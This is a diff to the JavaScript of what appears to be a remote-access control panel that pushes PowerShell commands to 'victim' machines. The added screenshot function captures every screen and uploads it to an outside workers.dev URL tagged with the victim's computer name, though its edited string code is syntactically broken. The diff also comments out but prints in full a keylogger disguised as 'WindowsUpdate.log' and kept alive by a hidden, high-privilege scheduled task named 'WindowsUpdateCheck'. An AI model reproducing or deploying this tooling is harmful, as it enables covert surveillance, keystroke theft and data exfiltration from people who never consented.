@@ -933,29 +933,29 @@ async function viewFile(key, dataType) {
     }
 }
 
-        function takeScreenshot(id) {
-            const cmd = `
-Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-$screens = [Windows.Forms.Screen]::AllScreens
-$top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
-$left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
-$width = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum
-$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
-$bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
-$graphics = [Drawing.Graphics]::FromImage($bmp)
-$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-$ms = New-Object IO.MemoryStream
-$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
-$b64 = [Convert]::ToBase64String($ms.ToArray())
-$graphics.Dispose()
-$bmp.Dispose()
-Invoke-RestMethod -Uri "YOUR_WORKER_URL/upload" -Method POST -Headers @{"X-Victim-ID"="$env:COMPUTERNAME";"X-Filename"="screenshot.png";"X-Data-Type"="screenshot"} -Body "data:image/png;base64,$b64"
-        `.trim();
+function takeScreenshot(id) {
+    var cmd =
+        'Add-Type -AssemblyName System.Windows.Forms,System.Drawing\n' +
+        '$screens = [Windows.Forms.Screen]::AllScreens\n' +
+        '$top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum\n' +
+        '$left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum\n' +
+        '$width = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum\n' +
+        '$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum\n' +
+        '$bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)\n' +
+        '$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height\n' +
+        '$graphics = [Drawing.Graphics]::FromImage($bmp)\n' +
+        '$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)\n' +
+        '$ms = New-Object IO.MemoryStream\n' +
+        '$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)\n' +
+        '$b64 = [Convert]::ToBase64String($ms.ToArray())\n' +
+        '$graphics.Dispose()\n' +
+        '$bmp.Dispose()'
+        'Invoke-RestMethod -Uri "readme.sharansahu1604.workers.dev/upload" -Method POST -Headers @{"X-Victim-ID"="$env:COMPUTERNAME";"X-Filename"="screenshot.png";"X-Data-Type"="screenshot"} -Body "data:image/png;base64,$b64"
+        `.trim()';
 
             const input = document.getElementById('cmd_' + id);
             input.value = cmd;
-            alert('Screenshot command ready. Replace YOUR_WORKER_URL with your actual worker URL, then click Execute.');
+            alert('Screenshot command ready.');
         }
 
         function browseFiles(id) {
@@ -963,70 +963,70 @@ Invoke-RestMethod -Uri "YOUR_WORKER_URL/upload" -Method POST -Headers @{"X-Victi
             quickCmd(id, cmd);
         }
 
-        function installKeylogger(id) {
-            const cmd = `
-$code = @"
-using System;
-using System.Runtime.InteropServices;
-using System.IO;
-using System.Text;
-using System.Windows.Forms;
+//         function installKeylogger(id) {
+//             const cmd = `
+// $code = @"
+// using System;
+// using System.Runtime.InteropServices;
+// using System.IO;
+// using System.Text;
+// using System.Windows.Forms;
 
-public class KeyLogger {
-    [DllImport("user32.dll")]
-    public static extern int GetAsyncKeyState(Int32 i);
+// public class KeyLogger {
+//     [DllImport("user32.dll")]
+//     public static extern int GetAsyncKeyState(Int32 i);
     
-    public static void Main() {
-        string logFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "WindowsUpdate.log";
+//     public static void Main() {
+//         string logFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "WindowsUpdate.log";
         
-        while(true) {
-            System.Threading.Thread.Sleep(100);
-            for(int i = 8; i < 255; i++) {
-                int state = GetAsyncKeyState(i);
-                if(state == 1 || state == -32767) {
-                    string key = ((Keys)i).ToString();
-                    File.AppendAllText(logFile, key + " ");
-                }
-            }
-        }
-    }
-}
-"@
+//         while(true) {
+//             System.Threading.Thread.Sleep(100);
+//             for(int i = 8; i < 255; i++) {
+//                 int state = GetAsyncKeyState(i);
+//                 if(state == 1 || state == -32767) {
+//                     string key = ((Keys)i).ToString();
+//                     File.AppendAllText(logFile, key + " ");
+//                 }
+//             }
+//         }
+//     }
+// }
+// "@
 
-Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command "[KeyLogger]::Main()""
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -RunLevel Highest -Force
-Start-ScheduledTask -TaskName "WindowsUpdateCheck"
-"Keylogger installed and started"
-        `.trim();
+// Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms
+// $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command "[KeyLogger]::Main()""
+// $trigger = New-ScheduledTaskTrigger -AtLogOn
+// Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -RunLevel Highest -Force
+// Start-ScheduledTask -TaskName "WindowsUpdateCheck"
+// "Keylogger installed and started"
+//         `.trim();
 
-            quickCmd(id, cmd);
-        }
+//             quickCmd(id, cmd);
+//         }
 
-        function checkKeylogger(id) {
-            const cmd = `
-$logFile = "$env:APPDATA\\WindowsUpdate.log"
-if (Test-Path $logFile) {
-    Get-Content $logFile -Tail 200
-} else {
-    "No keylog file found"
-}
-    `.trim();
+//         function checkKeylogger(id) {
+//             const cmd = `
+// $logFile = "$env:APPDATA\\WindowsUpdate.log"
+// if (Test-Path $logFile) {
+//     Get-Content $logFile -Tail 200
+// } else {
+//     "No keylog file found"
+// }
+//     `.trim();
 
-            quickCmd(id, cmd);
-        }
+//             quickCmd(id, cmd);
+//         }
 
 
-        function removeKeylogger(id) {
-            const cmd = `
-Unregister-ScheduledTask -TaskName "WindowsUpdateCheck" -TaskPath "\\" -Confirm:$false -ErrorAction SilentlyContinue
-Remove-Item "$env:APPDATA\\WindowsUpdate.log" -Force -ErrorAction SilentlyContinue
-Write-Output "Keylogger removed"
-    `.trim();
+//         function removeKeylogger(id) {
+//             const cmd = `
+// Unregister-ScheduledTask -TaskName "WindowsUpdateCheck" -TaskPath "\\" -Confirm:$false -ErrorAction SilentlyContinue
+// Remove-Item "$env:APPDATA\\WindowsUpdate.log" -Force -ErrorAction SilentlyContinue
+// Write-Output "Keylogger removed"
+//     `.trim();
 
-            quickCmd(id, cmd);
-        }
+//             quickCmd(id, cmd);
+//         }
 
 
         async function killVictim(id) {
